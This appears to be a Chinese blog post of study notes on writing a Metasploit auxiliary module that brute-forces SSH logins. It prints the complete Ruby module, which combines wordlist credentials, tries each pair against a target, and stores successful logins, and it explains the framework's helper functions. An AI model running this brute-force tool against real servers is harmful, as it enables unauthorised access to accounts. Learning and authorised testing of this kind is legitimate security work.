刚才编写了一个ftp的banner模块

核心代码只有仅仅8行，msf yyds！

现在来编写一个

##### ssh的爆破模块

基本代码

```ruby
require 'msf/core' 
require 'metasploit/framework/credential_collection' 
require 'metasploit/framework/login_scanner/ssh' 
class Metasploit3 < Msf::Auxiliary 
 include Msf::Auxiliary::Scanner 
 include Msf::Auxiliary::Report 
 include Msf::Auxiliary::AuthBrute 
def initialize 
 super( 
 'Name' => 'SSH Scanner', 
 'Description' => %q{ 
 My Module. 
 }, 
 'Author' => 'Nipun Jaswal', 
 'License' => MSF_LICENSE 
 ) 
 register_options( 
 [ 
 Opt::RPORT(22) 
 ], self.class) 
 End
```

之前引入了Msf::Auxiliary::Scanner和Msf::Auxiliary:: Report，下面引入另外一个库文件Msf::Auxiliary::AuthBrute

|         引入语句          |                 路 径                 |                            用 途                             |
| :-----------------------: | :-----------------------------------: | :----------------------------------------------------------: |
| Msf::Auxiliary::AuthBrute | /lib/msf/core/auxiliary/auth_brute.rb | 提供了必要的暴力破解机制和功能，例如提供了单独的登录用户名和密码表、生词表、空密码等选项 |

前面的代码引入了三个库文件，分别是msf/core、metasploit/framework/login_scanner/ssh和
metasploit/framework/credential_collection。 msf/core库文件包含了 core库的路径。 metasploit/ 
framework/login_scanner/ssh包含了SSH登录扫描库，利用这个库可以避免所有的手动操作，它还
提供了SSH扫描的基础API。metasploit/framework/credential_collection帮助我们通过使用datastore
中的用户输入，创建复合的登录凭证。

核心代码1

```ruby
def run_host(ip) 
 cred_collection = Metasploit::Framework::CredentialCollection.new( 
 blank_passwords: datastore['BLANK_PASSWORDS'], 
 pass_file: datastore['PASS_FILE'], 
 password: datastore['PASSWORD'], 
 user_file: datastore['USER_FILE'], 
 userpass_file: datastore['USERPASS_FILE'], 
 username: datastore['USERNAME'], 
 user_as_pass: datastore['USER_AS_PASS'], 
 ) 
 scanner = Metasploit::Framework::LoginScanner::SSH.new( 
 host: ip, 
 port: datastore['RPORT'], 
 cred_details: cred_collection, 
 proxies: datastore['Proxies'], 
 stop_on_success: datastore['STOP_ON_SUCCESS'], 
 bruteforce_speed: datastore['BRUTEFORCE_SPEED'], 
 connection_timeout: datastore['SSH_TIMEOUT'], 
 framework: framework, 
 framework_module: self, 
 )
```

其中的cred_collection对象会基于用户的输入产生登录凭证（直接本地批量产生数据包？），scanner对象会使用这些登录凭证去扫描目标。（发送数据包）

核心代码2

```ruby
    scanner.scan! do |result|	#初始化扫描，result迭代数组？ruby语法糖好迷
      credential_data = result.to_h	#转换hash
      credential_data.merge!(	#返回一个新的哈希，包含 hash 和 other_hash 的内容，重写 hash 中与 other_hash 带有重复键的键值对。
        module_fullname: self.fullname,
        workspace_id: myworkspace_id
      )	#合并
      if result.success?	#success变量
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)
        print_good "#{ip} - LOGIN SUCCESSFUL: #{result.credential}"
      else
        invalidate_login(credential_data)
        print_status "#{ip} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
      end
    end
  end
end
```

|           函 数           |             库 文 件              |                           用 途                            |
| :-----------------------: | :-------------------------------: | :--------------------------------------------------------: |
|    create_credential()    | /lib/msf/core/auxiliary/report.rb |               从result对象中得到登录凭证数据               |
| create_credential_login() | /lib/msf/core/auxiliary/report.rb | 从result对象中创建登录凭证，利用这个凭证可以登录特定的服务 |
|    invalidate_login()     | /lib/msf/core/auxiliary/report.rb |            用来标记一些对目标服务无效的登录凭证            |

**This module provides methods for reporting data to the DB**

**此模块提供了向数据库报告数据的方法**

##### create_credential(opts = {}) ⇒ Object

```ruby
  def create_credential(opts={})
    if active_db?
      opts = { :task_id => mytask.id }.merge(opts) if mytask
      framework.db.create_credential(opts)
    elsif !db_warning_given?
      vprint_warning('No active DB -- Credential data will not be saved!')
    end
  end
```

##### create_credential_login(opts = {}) ⇒ Object

```ruby
  def create_credential_login(opts={})
    if active_db?
      opts = { :task_id => mytask.id }.merge(opts) if mytask
      framework.db.create_credential_login(opts)
    elsif !db_warning_given?
      vprint_warning('No active DB -- Credential data will not be saved!')
    end
  end
```

##### invalidate_login(opts = {}) ⇒ Object

```ruby
  def invalidate_login(opts={})
    if active_db?
      opts = { :task_id => mytask.id }.merge(opts) if mytask
      framework.db.invalidate_login(opts)
    elsif !db_warning_given?
      vprint_warning('No active DB -- Credential data will not be saved!')
    end
  end
```

换个角度来看这个过程

1. 我们已经创建好了一个CredentialCollection对象，它将处理所有类型的用户输入和用户凭证。这表明我们提供的用户名和密码将会被该对象认为是用户凭证。不过如果使用USER_FILE和PASS_FILE作为字典，这个对象就会将字典中的每一个用户名和每一个密码进行一次组合，并将这个组合作为一个用户凭证。
2. 为SSH服务创建了一个scanner对象，这个对象将会删除所有的手动输入命令，然后依次测试我们提供的所有用户名/密码组合。
3.  使用.scan方法运行scanner，这样就可以开始对目标的用户凭证进行暴力破解。
4. .scan方法将会依次使用所有用户凭证尝试登录。然后根据尝试结果，或者使用print_good函数打印输出并将其保存到数据库中，或者使用print_status打印函数但不保存到数据库。



大概流程很简单，但是细节却有很多不太了解，随着继续学习msf，以后一定会理解的。

越学越感觉msf的强大，这就是框架吗？？？！！！yyds！

接下来我会慢慢的来学习msf自带的模块。